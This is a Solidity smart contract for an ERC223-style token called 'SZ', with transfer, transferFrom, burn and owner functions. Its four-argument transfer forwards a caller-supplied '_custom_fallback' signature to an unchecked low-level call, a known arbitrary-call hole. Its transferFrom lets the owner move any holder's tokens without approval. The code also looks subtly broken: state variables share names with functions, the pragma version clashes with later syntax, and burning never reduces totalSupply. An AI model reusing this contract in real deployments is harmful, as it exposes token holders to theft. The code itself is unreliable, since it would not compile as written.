1 pragma solidity ^0.4.9;
2  
3 
4 contract SafeMath {
5     uint256 constant public MAX_UINT256 =
6     0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF;
7 
8     function safeAdd(uint256 x, uint256 y) pure internal returns (uint256 z) {
9         if (x > MAX_UINT256 - y) assert(false);
10         return x + y;
11     }
12 
13     function safeSub(uint256 x, uint256 y) pure internal returns (uint256 z) {
14         if (x < y) assert(false);
15         return x - y;
16     }
17 
18     function safeMul(uint256 x, uint256 y) pure internal returns (uint256 z) {
19         if (y == 0) return 0;
20         if (x > MAX_UINT256 / y) assert(false);
21         return x * y;
22     }
23 }
24 
25 contract ContractReceiver {
26     function tokenFallback(address _from, uint _value, bytes _data) public;
27 }
28  
29 contract SZ is SafeMath { 
30     
31     event Transfer(address indexed _from, address indexed _to, uint256 _value);
32     event Burn(address indexed burner, uint256 value);
33 
34     mapping(address => uint) balances;
35   
36     string public name    = "SZ";
37     string public symbol  = "SZ";
38     uint8 public decimals = 8;
39     uint256 public totalSupply;
40     uint256 public burn;
41 	address owner;
42   
43     constructor(uint256 _supply, string _name, string _symbol, uint8 _decimals) public
44     {
45         if (_supply == 0) _supply = 500000000000000000;
46 
47         owner = msg.sender;
48         balances[owner] = _supply;
49         totalSupply = balances[owner];
50 
51         name = _name;
52         decimals = _decimals;
53         symbol = _symbol;
54     }
55     
56 
57   
58   
59   // Function to access name of token .
60   function name() public constant returns (string _name) {
61       return name;
62   }
63   // Function to access symbol of token .
64   function symbol() public constant returns (string _symbol) {
65       return symbol;
66   }
67   // Function to access decimals of token .
68   function decimals() public constant returns (uint8 _decimals) {
69       return decimals;
70   }
71   // Function to access total supply of tokens .
72   function totalSupply() public constant returns (uint256 _totalSupply) {
73       return totalSupply;
74   }
75   
76   
77   // Function that is called when a user or another contract wants to transfer funds .
78   function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
79       
80     if(isContract(_to)) {
81         if (balanceOf(msg.sender) < _value) assert(false);
82         balances[msg.sender] = safeSub(balanceOf(msg.sender), _value);
83         balances[_to] = safeAdd(balanceOf(_to), _value);
84         assert(_to.call.value(0)(bytes4(keccak256(abi.encodePacked(_custom_fallback))), msg.sender, _value, _data));
85         emit Transfer(msg.sender, _to, _value);
86         return true;
87     }
88     else {
89         return transferToAddress(_to, _value, _data);
90     }
91 }
92   
93 
94   // Function that is called when a user or another contract wants to transfer funds .
95   function transfer(address _to, uint _value, bytes _data) public returns (bool success) {
96       
97     if(isContract(_to)) {
98         return transferToContract(_to, _value, _data);
99     }
100     else {
101         return transferToAddress(_to, _value, _data);
102     }
103 }
104   
105     // Standard function transfer similar to ERC20 transfer with no _data .
106     // Added due to backwards compatibility reasons .
107     function transfer(address _to, uint _value) public returns (bool success) {
108 
109         //standard function transfer similar to ERC20 transfer with no _data
110         //added due to backwards compatibility reasons
111         bytes memory empty;
112         if(isContract(_to)) {
113             return transferToContract(_to, _value, empty);
114         }
115         else {
116             return transferToAddress(_to, _value, empty);
117         }
118     }
119 
120 	//assemble the given address bytecode. If bytecode exists then the _addr is a contract.
121     function isContract(address _addr) private view returns (bool is_contract) {
122         uint length;
123         assembly {
124         //retrieve the size of the code on target address, this needs assembly
125             length := extcodesize(_addr)
126         }
127         return (length>0);
128     }
129 
130 	//function that is called when transaction target is an address
131     function transferToAddress(address _to, uint _value, bytes _data) private returns (bool success) {
132         _data = '';
133         if (balanceOf(msg.sender) < _value) assert(false);
134         balances[msg.sender] = safeSub(balanceOf(msg.sender), _value);
135         balances[_to] = safeAdd(balanceOf(_to), _value);
136         emit Transfer(msg.sender, _to, _value);
137         return true;
138     }
139   
140   //function that is called when transaction target is a contract
141     function transferToContract(address _to, uint _value, bytes _data) private returns (bool success) {
142         if (balanceOf(msg.sender) < _value) assert(false);
143         balances[msg.sender] = safeSub(balanceOf(msg.sender), _value);
144         balances[_to] = safeAdd(balanceOf(_to), _value);
145         ContractReceiver receiver = ContractReceiver(_to);
146         receiver.tokenFallback(msg.sender, _value, _data);
147         emit Transfer(msg.sender, _to, _value);
148         return true;
149     }
150 
151     function transferFrom(address _from, address _to, uint256 _value) public {
152         if(!isOwner()) return;
153 
154         if (balances[_from] < _value) return;    
155         if (safeAdd(balances[_to] , _value) < balances[_to]) return;
156 
157         balances[_from] = safeSub(balances[_from],_value);
158         balances[_to] = safeAdd(balances[_to],_value);
159         /* Notifiy anyone listening that this transfer took place */
160         
161         emit Transfer(_from, _to, _value);
162     }
163 
164     function burn(uint256 _value) public {
165         if (balances[msg.sender] < _value) return;    
166         balances[msg.sender] = safeSub(balances[msg.sender],_value);
167         burn = safeAdd(burn,_value);
168         emit Burn(msg.sender, _value);
169     }
170 
171 	function isOwner() public view  
172     returns (bool)  {
173         return owner == msg.sender;
174     }
175 	
176     function balanceOf(address _owner) public constant returns (uint balance) {
177         return balances[_owner];
178     }
179 }